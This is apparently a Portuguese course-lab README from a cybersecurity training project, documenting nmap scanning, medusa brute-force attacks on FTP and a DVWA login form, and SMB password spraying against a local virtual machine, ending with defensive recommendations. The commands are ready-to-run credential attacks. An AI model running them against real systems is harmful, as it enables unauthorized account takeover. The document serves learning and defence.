# 🧠 Testes de Segurança — Ambiente de Aprendizado

![Status](https://img.shields.io/badge/status-educational-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Platform](https://img.shields.io/badge/platform-VirtualBox-lightgrey)
![Language](https://img.shields.io/badge/language-Bash-yellow)
![Purpose](https://img.shields.io/badge/purpose-cybersecurity-critical)

> *Projeto desenvolvido no contexto do curso: **Santander - Cibersegurança 2025**, oferecido pela plataforma **DIO (Digital Innovation One)**.*  
>  
> *Este relatório documenta testes realizados em ambiente controlado, com finalidade exclusivamente educativa e de aprendizado técnico.*


---

## 🧩 Sobre
Este repositório documenta uma série de testes realizados **apenas** em um laboratório isolado (máquinas virtuais locais) com finalidade educativa.  
Não houve qualquer ataque a sistemas reais; todos os procedimentos foram executados em uma rede *host-only* sem acesso à Internet pública.

---

## 🎯 Objetivo
Investigar vulnerabilidades comuns em serviços mal configurados (FTP, HTTP e SMB), compreender a mecânica de ataques de *força bruta* e *password spray*, e propor medidas de mitigação e boas práticas de segurança.

---

## ⚠️ Aviso de Ética e Uso
> ⚠️ **Atenção:**  
> Este material é **exclusivamente educacional**.  
> Não execute nenhuma técnica descrita aqui contra sistemas sem autorização explícita.  

---

## 🧰 Pré-requisitos
- **Oracle VirtualBox** (ou outro hipervisor)  
- **Duas máquinas virtuais** (atacante e alvo) em rede *host-only*  
- Ferramentas utilizadas:
  - `nmap`
  - `medusa`
  - `enum4linux`
  - `smbclient`
- **Snapshot** das VMs antes de iniciar os testes


---

## 💻 Ambiente de Testes
- Rede configurada como *host-only*  
- Snapshot criado antes de iniciar os testes  
- IP da máquina alvo: `192.168.56.101`  
- Conectividade validada via `ping`

---

## 🧪 Procedimentos Realizados

### 1. Enumeração de Portas (Nmap)
```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

Identificadas as portas abertas, incluindo 21 (FTP).

**2. Ataque de Força Bruta — FTP**

Criação de listas simples de usuários e senhas:
```bash
echo -e "admin\nuser\ntest" > users.txt
echo -e "1234\nadmin\npassword" > pass.txt
```
Execução:
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 8
```
Verificação de sucesso feita via login FTP.

**3. Ataque HTTP — DVWA**

Aplicação-alvo: Damn Vulnerable Web Application (DVWA)
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' -t 8
```
Simulação de ataque de força bruta em página web, identificando credenciais válidas.


---


**4. Password Spray — SMB**

Enumeração de usuários e ataque:
```bash
enum4linux -a 192.168.56.101 | tee info.txt
medusa -h 192.168.56.101 -U users2.txt -P wpass.txt -M smbnt -t 8 -T 50
smbclient -L //192.168.56.101 -U <usuario>
```
Serviço SMB vulnerável a senhas comuns,o que permitiu identificar credenciais validas e com isso acessar o sistena.

<BR>
<BR>

## 📊 Conclusões

Os testes demonstraram como configurações incorretas e senhas previsíveis continuam sendo uma das principais portas de entrada para invasões. Mesmo ferramentas simples podem explorar essas falhas, reforçando a importância de políticas de segurança bem definidas, monitoramento ativo e educação contínua dos usuários.

<BR>
<BR>

## 🛡️ Recomendações de Defesa

* Bloqueio de IP após múltiplas tentativas de login.

* Limitar tentativas por usuário e por tempo.

* Implementar autenticação em dois fatores (2FA).

* Exigir senhas fortes e alteração periódica.

* Monitorar e auditar serviços continuamente.

* Desativar serviços desnecessários e revisar configurações.


<BR>
<BR>


---

[![LinkedIn](https://img.shields.io/badge/LinkedIn-pauloaugustoramos-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/pauloaugustoramos)


~~ Curso: Santander - Cibersegurança 2025 — DIO
